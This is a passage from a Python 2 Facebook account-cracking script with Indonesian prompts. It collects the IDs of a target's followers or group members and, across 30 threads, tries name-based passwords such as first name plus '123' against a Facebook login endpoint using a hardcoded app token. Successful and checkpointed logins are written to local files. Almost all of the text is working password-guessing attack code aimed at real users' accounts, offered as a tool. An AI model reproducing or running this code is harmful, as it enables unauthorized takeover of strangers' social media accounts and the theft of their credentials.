                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/grup.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
                                    cek = open('done/grup.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mSelesai ...'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;96m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/grup.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;96mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '              \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
        raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
        keluar()
    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/follow.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
                cek = open('done/follow.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/follow.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
                    cek = open('done/follow.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/follow.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
                        cek = open('done/follow.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/follow.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
                            cek = open('done/follow.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/follow.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
                                cek = open('done/follow.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/follow.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos6
                                    cek = open('done/follow.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mSelesai ...'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;95m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/follow.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;95mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def user_id():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Username : ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
    menu()
def perbarui():
    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mMemperbarui Script ...\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;94m{\x1b[1;97m<Kembali>\x1b[1;94m}')
    os.system('python2 cr4ck.py')
if __name__ == '__main__':
    menu()
    masuk()
# Mau Ngapain Cuk?